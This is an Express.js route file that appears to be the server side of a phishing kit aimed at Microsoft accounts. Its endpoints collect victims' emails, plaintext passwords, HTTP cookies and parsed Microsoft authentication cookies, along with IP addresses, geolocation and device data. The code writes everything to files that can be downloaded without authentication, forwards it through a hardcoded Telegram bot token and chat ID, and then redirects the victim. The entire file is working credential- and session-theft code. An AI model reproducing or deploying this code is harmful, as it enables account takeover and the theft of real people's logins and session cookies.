// routes/login-notify.js
const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// Configure via env variables
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CHAT_ID || "6068638071";

const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
const COOKIES_DIR = path.join(__dirname, '../cookies');

// Telegram message sending function
async function sendTelegramMessage(message) {
  if (!TELEGRAM_API) {
    console.warn('Telegram API not configured');
    return { success: false, error: 'Not configured' };
  }

  try {
    console.log('Attempting to send Telegram message...');
    
    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      }),
      timeout: 10000
    });

    const result = await response.json();
    
    console.log('Telegram API Response:', {
      status: response.status,
      ok: response.ok,
      result: result
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${result.description || response.statusText}`);
    }

    return { success: true, data: result };
    
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return { 
      success: false, 
      error: error.message,
      stack: error.stack 
    };
  }
}

async function ensureCookiesDir() {
  try {
    await fs.access(COOKIES_DIR);
  } catch (error) {
    await fs.mkdir(COOKIES_DIR, { recursive: true });
  }
}

// Enhanced function to handle both HTTP and JS cookies
async function createCookiesFile(email, ip, cookiesBefore, jsCookieData = null, redirectUrl = null) {
  await ensureCookiesDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `cookies_${email.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.txt`;
  const filepath = path.join(COOKIES_DIR, filename);
  
  let fileContent = `Cookies Capture Report
====================
Email: ${email}
IP: ${ip}
Timestamp: ${new Date().toISOString()}
Redirect URL: ${redirectUrl || 'No redirect'}
File: ${filename}

INITIAL HTTP COOKIES (Before any action):
${Object.entries(cookiesBefore).map(([k, v]) => `${k}: ${v}`).join('\n')}

Total Initial HTTP Cookies: ${Object.keys(cookiesBefore).length}
`;

  // Add JavaScript cookie data if provided
  if (jsCookieData) {
    fileContent += `

JAVASCRIPT COOKIE DATA FOUND:
============================

Raw JS Cookie Script:
${jsCookieData.substring(0, 2000)}...${jsCookieData.length > 2000 ? `\n[Truncated - total ${jsCookieData.length} chars]` : ''}

`;

    try {
      // Try to parse the JavaScript cookie data
      const cookieMatch = jsCookieData.match(/JSON\.parse\(`([^`]+)`\)/);
      if (cookieMatch && cookieMatch[1]) {
        const cookiesJson = cookieMatch[1];
        const cookiesArray = JSON.parse(cookiesJson);
        
        fileContent += `PARSED MICROSOFT AUTHENTICATION COOKIES (${cookiesArray.length}):\n`;
        fileContent += '='.repeat(50) + '\n\n';
        
        cookiesArray.forEach((cookie, index) => {
          fileContent += `COOKIE ${index + 1}:\n`;
          fileContent += `Name: ${cookie.Name}\n`;
          fileContent += `Value: ${cookie.Value}\n`;
          fileContent += `Domain: ${cookie.Domain}\n`;
          fileContent += `Path: ${cookie.Path}\n`;
          fileContent += `Secure: ${cookie.Secure}\n`;
          fileContent += `HttpOnly: ${cookie.HttpOnly}\n`;
          fileContent += `SameSite: ${cookie.SameSite}\n`;
          if (cookie.Expires) fileContent += `Expires: ${new Date(cookie.Expires * 1000).toISOString()}\n`;
          fileContent += '-'.repeat(30) + '\n\n';
        });

        // Extract redirect URL
        const redirectMatch = jsCookieData.match(/window\.location\.href=atob\("([^"]+)"\)/);
        if (redirectMatch && redirectMatch[1]) {
          const redirectBase64 = redirectMatch[1];
          const redirectUrl = Buffer.from(redirectBase64, 'base64').toString();
          fileContent += `REDIRECT URL: ${redirectUrl}\n\n`;
        }
      }
    } catch (parseError) {
      fileContent += `ERROR PARSING JS COOKIE DATA: ${parseError.message}\n\n`;
    }
  }

  await fs.writeFile(filepath, fileContent);
  return { filename, filepath };
}

// ==================== ROUTES ====================

// Health check
router.get('/health', (req, res) => {
  res.json({ 
    status: 'ok',
    service: 'login-notify',
    time: new Date().toISOString(),
    telegramConfigured: !!TELEGRAM_API
  });
});

// File download routes
router.get('/download-cookies/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(COOKIES_DIR, filename);
    
    console.log('Attempting to download file:', filename);
    
    // Check if file exists
    try {
      await fs.access(filepath);
      console.log('File exists:', filepath);
    } catch (error) {
      console.log('File not found:', filepath);
      return res.status(404).json({ 
        success: false, 
        message: "Cookie file not found"
      });
    }
    
    // Set headers for file download
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    
    // Stream the file to the client
    const fileStream = require('fs').createReadStream(filepath);
    fileStream.pipe(res);
    
  } catch (error) {
    console.error('Error downloading cookie file:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error downloading file"
    });
  }
});

// List all cookie files
router.get('/cookie-files', async (req, res) => {
  try {
    await ensureCookiesDir();
    const files = await fs.readdir(COOKIES_DIR);
    const cookieFiles = files.filter(file => file.startsWith('cookies_') && file.endsWith('.txt'));
    
    res.json({
      success: true,
      totalFiles: cookieFiles.length,
      files: cookieFiles.map(file => ({
        filename: file,
        downloadUrl: `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${file}`
      }))
    });
  } catch (error) {
    console.error('Error listing cookie files:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error listing files"
    });
  }
});

// Test route to verify file creation
router.get('/test-files', async (req, res) => {
  try {
    await ensureCookiesDir();
    const files = await fs.readdir(COOKIES_DIR);
    const cookieFiles = files.filter(file => file.startsWith('cookies_'));
    
    res.json({
      success: true,
      message: `Found ${cookieFiles.length} cookie files`,
      totalFiles: cookieFiles.length,
      files: cookieFiles,
      cookiesDir: COOKIES_DIR
    });
  } catch (error) {
    res.json({
      success: false,
      message: error.message,
      cookiesDir: COOKIES_DIR
    });
  }
});

// Telegram test route
router.post('/test-telegram', async (req, res) => {
  try {
    const testMessage = `🤖 TEST MESSAGE - Server is working!
Time: ${new Date().toISOString()}
This confirms Telegram notifications are working!
Email: test@example.com
Password: test123`;

    console.log('Testing Telegram...');
    const result = await sendTelegramMessage(testMessage);
    
    res.json({
      success: result.success,
      telegramTest: true,
      message: result.success ? 'Telegram message sent successfully!' : 'Failed to send',
      error: result.error
    });
    
  } catch (error) {
    console.error('Telegram test error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Main login-notify endpoint
router.post('/', async (req, res) => {
  try {
    console.log('=== LOGIN-NOTIFY ENDPOINT HIT ===');
    console.log('Body:', req.body);

    const { email, password, redirect_url, js_cookie_data } = req.body || {};
    
    console.log('Received data:', { 
      email, 
      password: password ? '***' : 'missing', 
      redirect_url,
      hasJsCookieData: !!js_cookie_data
    });

    if (!email || !password) {
      return res.status(400).json({ 
        success: false, 
        message: "Missing email or password"
      });
    }

    // Capture cookies BEFORE any action
    const cookiesBefore = { ...req.cookies };
    
    // IP + geo
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    // UA parsing
    const parser = new UAParser(req.headers['user-agent'] || '');
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    // Create cookies file with JS cookie data
    let fileInfo = null;
    try {
      fileInfo = await createCookiesFile(email, ip, cookiesBefore, js_cookie_data, redirect_url);
      console.log(`Cookies file created: ${fileInfo.filename}`);
    } catch (fileError) {
      console.error('Error creating cookies file:', fileError);
    }

    // Build Telegram message
    let message = `LOGIN NOTIFICATION

Email: ${email}
Password: ${password}
IP: ${ip}
Location: ${locationStr}
Timestamp: ${new Date().toISOString()}
Device: ${deviceType}
Redirect URL: ${redirect_url || 'None'}
Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
Download URL: ${fileInfo ? `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${fileInfo.filename}` : 'None'}

HTTP Cookies (${Object.keys(cookiesBefore).length}):
${Object.entries(cookiesBefore).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)'}
`;

    // Add JS cookie info to Telegram message
    if (js_cookie_data) {
      try {
        const cookieMatch = js_cookie_data.match(/JSON\.parse\(`([^`]+)`\)/);
        if (cookieMatch && cookieMatch[1]) {
          const cookiesJson = cookieMatch[1];
          const cookiesArray = JSON.parse(cookiesJson);
          
          message += `\nMICROSOFT AUTH COOKIES (${cookiesArray.length}):\n`;
          cookiesArray.forEach(cookie => {
            message += `- ${cookie.Name}: ${cookie.Value.substring(0, 50)}...\n`;
          });

          const redirectMatch = js_cookie_data.match(/window\.location\.href=atob\("([^"]+)"\)/);
          if (redirectMatch && redirectMatch[1]) {
            const redirectUrl = Buffer.from(redirectMatch[1], 'base64').toString();
            message += `\nJS Redirect: ${redirectUrl}\n`;
          }
        }
      } catch (parseError) {
        message += `\nJS Cookies: (parse error: ${parseError.message})\n`;
      }
    }

    // Send to Telegram
    console.log('Sending Telegram notification...');
    const telegramResult = await sendTelegramMessage(message);
    
    if (!telegramResult.success) {
      console.error('Failed to send Telegram notification:', telegramResult.error);
    } else {
      console.log('Telegram notification sent successfully');
    }

    // Handle redirect
    if (redirect_url) {
      // Set tracking cookies
      res.cookie('login_tracker', `track_${Date.now()}`, { 
        maxAge: 900000,
        httpOnly: true 
      });
      res.cookie('user_session', `session_${email}_${Date.now()}`, {
        maxAge: 3600000,
        httpOnly: true
      });
      
      return res.redirect(redirect_url);
    }

    // JSON response
    return res.status(200).json({
      success: true,
      message: "Login processed",
      telegramSent: telegramResult.success,
      redirect: redirect_url || false,
      loginDetails: {
        device: deviceType,
        ip,
        location: locationStr,
        httpCookiesCount: Object.keys(cookiesBefore).length,
        jsCookiesFound: !!js_cookie_data,
        cookiesFile: fileInfo?.filename,
        downloadUrl: fileInfo ? `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${fileInfo.filename}` : null
      }
    });

  } catch (error) {
    console.error("Full error in /login-notify:", error);
    return res.status(500).json({ 
      success: false, 
      message: "Internal server error",
      error: error.message
    });
  }
});

// CHUKACHINA endpoint - handles your existing frontend requests
router.post('/chukachina', async (req, res) => {
  try {
    console.log('=== CHUKACHINA ENDPOINT HIT ===');
    console.log('Body:', req.body);

    const { email, password, targetDomain, js_cookie_data, http_cookies, user_agent, page_url } = req.body || {};
    
    if (!email || !password) {
      return res.status(400).json({ 
        success: false, 
        message: "Missing email or password" 
      });
    }

    // IP + geo
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    // UA parsing (use provided user_agent or fallback)
    const parser = new UAParser(user_agent || req.headers['user-agent'] || '');
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    // Create cookies file
    let fileInfo = null;
    try {
      fileInfo = await createCookiesFile(email, ip, http_cookies || {}, js_cookie_data, null);
      console.log(`Cookies file created: ${fileInfo.filename}`);
    } catch (fileError) {
      console.error('Error creating cookies file:', fileError);
    }

    // Build Telegram message
    let message = `LOGIN NOTIFICATION (from /chukachina)

Email: ${email}
Password: ${password}
IP: ${ip}
Location: ${locationStr}
Timestamp: ${new Date().toISOString()}
Device: ${deviceType}
Target Domain: ${targetDomain || 'None'}
Page URL: ${page_url || 'None'}
Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
Download URL: ${fileInfo ? `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${fileInfo.filename}` : 'None'}

HTTP Cookies (${Object.keys(http_cookies || {}).length}):
${Object.entries(http_cookies || {}).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)'}
`;

    // Add JS cookie info to Telegram message
    if (js_cookie_data) {
      try {
        const cookieMatch = js_cookie_data.match(/JSON\.parse\(`([^`]+)`\)/);
        if (cookieMatch && cookieMatch[1]) {
          const cookiesJson = cookieMatch[1];
          const cookiesArray = JSON.parse(cookiesJson);
          
          message += `\nMICROSOFT AUTH COOKIES (${cookiesArray.length}):\n`;
          cookiesArray.forEach(cookie => {
            message += `- ${cookie.Name}: ${cookie.Value.substring(0, 50)}...\n`;
          });

          const redirectMatch = js_cookie_data.match(/window\.location\.href=atob\("([^"]+)"\)/);
          if (redirectMatch && redirectMatch[1]) {
            const redirectUrl = Buffer.from(redirectMatch[1], 'base64').toString();
            message += `\nJS Redirect: ${redirectUrl}\n`;
          }
        }
      } catch (parseError) {
        message += `\nJS Cookies: (parse error: ${parseError.message})\n`;
      }
    }

    // Send to Telegram
    console.log('Sending Telegram notification from /chukachina...');
    const telegramResult = await sendTelegramMessage(message);
    
    if (!telegramResult.success) {
      console.error('Failed to send Telegram notification:', telegramResult.error);
    } else {
      console.log('Telegram notification sent successfully');
    }

    // Return success with download info
    return res.status(200).json({
      success: true,
      message: "Login data received",
      telegramSent: telegramResult.success,
      attemptProcessed: true,
      downloadInfo: fileInfo ? {
        filename: fileInfo.filename,
        downloadUrl: `/login-notify/download-cookies/${fileInfo.filename}`,
        fullDownloadUrl: `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${fileInfo.filename}`
      } : null
    });

  } catch (error) {
    console.error("Full error in /chukachina:", error);
    return res.status(200).json({
      success: true,
      message: "Login processed (with errors)",
      error: error.message
    });
  }
});

module.exports = router;